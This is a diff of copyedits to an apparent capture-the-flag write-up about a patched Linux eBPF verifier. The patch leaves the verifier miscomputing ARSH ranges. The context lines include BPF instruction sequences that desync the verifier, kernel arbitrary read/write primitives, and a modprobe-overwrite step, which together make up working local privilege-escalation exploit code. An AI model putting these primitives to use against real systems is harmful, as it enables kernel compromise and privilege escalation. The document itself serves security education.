@@ -51,11 +51,11 @@ exec qemu-system-x86_64 \
 
 ```
 
-We can see all the common mitigations(SMEP, SMAP, KASLR) are present
+We can see all the common mitigations (SMEP, SMAP, KASLR) are present.
 
 ## Analyzing the patch
 
-I didn't really overanalyze first part of the patch, but I'll jump back to it later, now lets focus on the second part:
+I didn't really overanalyze the first part of the patch, but I'll jump back to it later; now let's focus on the second part:
 
 ```diff
  static int update_alu_sanitation_state(struct bpf_insn_aux_data *aux,
@@ -70,7 +70,7 @@ I didn't really overanalyze first part of the patch, but I'll jump back to it la
  	}
 ```
 
-eBPF is basically a virtual machine that runs inside a Linux kernel. It has its own registers, and it can perform arithmetic operations like addition, subtraction, etc. One thing that stands out is that it's trying to ensure memory safety on pointer operations, e.g. it won't allow you to read memory above the stack. It does that by keeping min and max possible values for each register. The structure that hold these information could be found at [https://elixir.bootlin.com/linux/v6.12.47/source/include/linux/bpf_verifier.h#L75](https://elixir.bootlin.com/linux/v6.12.47/source/include/linux/bpf_verifier.h#L75)
+eBPF is basically a virtual machine that runs inside a Linux kernel. It has its own registers, and it can perform arithmetic operations like addition, subtraction, etc. One thing that stands out is that it's trying to ensure memory safety on pointer operations, e.g. it won't allow you to read memory above the stack. It does that by keeping min and max possible values for each register. The structure that holds this information can be found at [https://elixir.bootlin.com/linux/v6.12.47/source/include/linux/bpf_verifier.h#L75](https://elixir.bootlin.com/linux/v6.12.47/source/include/linux/bpf_verifier.h#L75)
 
 ```c
 struct bpf_reg_state {
@@ -97,8 +97,8 @@ struct bpf_reg_state {
 };
 ```
 
-The structure is internally a bit more complex, and holds more information, but we'll focus on these field.
-The second part of the patch is changing the condition under which verifier considers it safe to compute min and max values. If we follow function call here [https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14131](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14131), we get to [__mark_reg_unbounded](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L1899) where it sets range to:
+The structure is internally a bit more complex, and holds more information, but we'll focus on these fields.
+The second part of the patch is changing the condition under which verifier considers it safe to compute min and max values. If we follow the function call here [https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14131](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14131), we get to [__mark_reg_unbounded](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L1899) where it sets range to:
 
 ```c
 static void __mark_reg_unbounded(struct bpf_reg_state *reg)
@@ -131,7 +131,7 @@ In other words, unsafe means it ranges from 0 to MAX_VALUE. Before the patch, ve
 	}
 ```
 
-This means during computation of ARSH, this condition is crucial for the security of whole operation, therefore we must look for the code that actually relies on this assumption. We can find it at [scalar_min_max_arsh](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14050)
+This means during computation of ARSH, this condition is crucial for the security of the whole operation, therefore we must look for the code that actually relies on this assumption. We can find it at [scalar_min_max_arsh](https://elixir.bootlin.com/linux/v6.12.47/source/kernel/bpf/verifier.c#L14050)
 
 ```c
 static void scalar_min_max_arsh(struct bpf_reg_state *dst_reg,
@@ -162,11 +162,11 @@ static void scalar_min_max_arsh(struct bpf_reg_state *dst_reg,
 }
 ```
 
-Comment says "Upon reaching here, src_known is true and umax_val is equal to umin_val", which is exactly what we are looking for. Here, verifier is thinking "if min == max, then I can use either of those values", which creates a desync between real register value, and (min, max) range kept by the verifier.
+The comment says "Upon reaching here, src_known is true and umax_val is equal to umin_val", which is exactly what we are looking for. Here, the verifier is thinking "if min == max, then I can use either of those values", which creates a desync between real register value, and (min, max) range kept by the verifier.
 
 ## Crafting arbitrary read/arbitrary write primitives
 
-In order to craft some read/write primitives, we are going to create BPF map. These are data structures that allow us topass some data from userspace to BPF program.
+In order to craft some read/write primitives, we are going to create a BPF map. These are data structures that allow us to pass some data from userspace to a BPF program.
 
 ```c
 static int bpf_create_map(uint32_t value_size) {
@@ -180,7 +180,7 @@ static int bpf_create_map(uint32_t value_size) {
 }
 ```
 
-this creates a map array-type map, with one entry. We'll set the entry value to 1 using:
+this creates an array-type map, with one entry. We'll set the entry value to 1 using:
 
 ```c
 static int bpf_map_update_elem(int fd, const void *key, const void *value) {
@@ -194,7 +194,7 @@ static int bpf_map_update_elem(int fd, const void *key, const void *value) {
 }
 ```
 
-Now, our high level plan would be(expressed in python-like language):
+Now, our high-level plan would be (expressed in Python-like language):
 
 ```python
 x = map[0]
@@ -218,14 +218,14 @@ now, remember these lines:
 
 `y` is our dst_reg, and `x` is our src_reg, so the range for `y` would be (1 >> 0, 1 >> 0) == (1, 1).
 But what if value of `x` was 1? Then correct range should've been (1 >> 1, 1 >> 1) == (0, 0), and this is our desync between verifier and the actual value.
-For conveniance, lets flip `y`'s value from 0 to 1:
+For convenience, let's flip `y`'s value from 0 to 1:
 
 ```python
 y *= -1
 y += 1
 ```
 
-now, `y == 1`, but verifier thinks it's range it's equal to 0, or in other words, it's range is (0, 0). This is very useful, as now we can use `y` for arithmetic operations to get out of bounds, while verifier would think the value doesn't change, as anything + 0 == 0. Let's write BPF program that uses this attack:
+now, `y == 1`, but the verifier thinks its value is 0, i.e. its range is (0, 0). This is very useful, as now we can use `y` for arithmetic operations to get out of bounds, while the verifier would think the value doesn't change, as anything + 0 == 0. Let's write BPF program that uses this attack:
 
 ```c
 uint64_t bpf_read_relative(uint64_t offset) {
@@ -244,9 +244,9 @@ uint64_t bpf_read_relative(uint64_t offset) {
 			BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),    // reg_6 = input
 			BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),
 			BPF_MOV64_IMM(BPF_REG_8, 0x1),
-			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while its 0
+			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while it's 0
 			BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, -1),
-			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while its 1
+			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while it's 1
 
 			BPF_LD_IMM64_RAW(BPF_REG_9, 0, offset),
 			BPF_ALU64_REG(BPF_MUL, BPF_REG_9, BPF_REG_8),
@@ -316,15 +316,15 @@ First part is just reading value from the map:
 			BPF_EXIT_INSN(),
 ```
 
-it involves pushing map's key to the stack(R10 is a stack pointer), and calling helper function that actually reads the value. BPF verifier requires user to check the output value, thats why the `BPF_JMP_IMM` is needed at the end. Next, we perform the desync, as explained before:
+it involves pushing the map's key to the stack (R10 is a stack pointer), and calling the helper function that actually reads the value. BPF verifier requires user to check the output value, that's why the `BPF_JMP_IMM` is needed at the end. Next, we perform the desync, as explained before:
 
 ```c
 			BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),    // reg_6 = input
 			BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),
 			BPF_MOV64_IMM(BPF_REG_8, 0x1),
-			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while its 0
+			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while it's 0
 			BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, -1),
-			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while its 1
+			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while it's 1
 
 			BPF_LD_IMM64_RAW(BPF_REG_9, 0, offset),
 			BPF_ALU64_REG(BPF_MUL, BPF_REG_9, BPF_REG_8),
@@ -333,7 +333,7 @@ it involves pushing map's key to the stack(R10 is a stack pointer), and calling 
 			BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
 ```
 
-and as a last part, we write the value we just read to output map, which is the way of returning the value to userspace:
+and as the last step, we write the value we just read to output map, which is the way of returning the value to userspace:
 
 ```c
 			BPF_LD_MAP_FD(BPF_REG_1, output_fd),
@@ -368,7 +368,7 @@ I've found those experimentally by poking around in pwndbg:
 	}
 ```
 
-Knowind `map_addr`, we can implement arbitrary read using simple math:
+Knowing `map_addr`, we can implement arbitrary read using simple math:
 
 ```c
 uint64_t bpf_read_absolute(uint64_t addr) {
@@ -377,7 +377,7 @@ uint64_t bpf_read_absolute(uint64_t addr) {
 }
 ```
 
-relative/arbitrary write functions are implemented the same way.
+relative/absolute write functions are implemented the same way.
 
 ## Getting the flag
 
@@ -401,7 +401,7 @@ We can finish the exploit by using standard modprobe technique:
 	system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/fake && chmod +x /tmp/fake && /tmp/fake; true");
 ```
 
-which lets us to just Cat The Flag.
+which lets us just Cat The Flag.
 
 Full exploit:
 
@@ -540,9 +540,9 @@ uint64_t bpf_write_relative(uint64_t offset, uint64_t value) {
 			BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),    // reg_6 = input
 			BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),
 			BPF_MOV64_IMM(BPF_REG_8, 0x1),
-			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while its 0
+			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while it's 0
 			BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, -1),
-			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while its 1
+			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while it's 1
 
 			BPF_LD_IMM64_RAW(BPF_REG_9, 0, offset),
 			BPF_ALU64_REG(BPF_MUL, BPF_REG_9, BPF_REG_8),
@@ -602,9 +602,9 @@ uint64_t bpf_read_relative(uint64_t offset) {
 			BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),    // reg_6 = input
 			BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1),
 			BPF_MOV64_IMM(BPF_REG_8, 0x1),
-			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while its 0
+			BPF_ALU64_REG(BPF_ARSH, BPF_REG_8, BPF_REG_6), // verifier thinks reg_8 == 1, while it's 0
 			BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, -1),
-			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while its 1
+			BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 1), // verifier thinks reg_8 == 0, while it's 1
 
 			BPF_LD_IMM64_RAW(BPF_REG_9, 0, offset),
 			BPF_ALU64_REG(BPF_MUL, BPF_REG_9, BPF_REG_8),
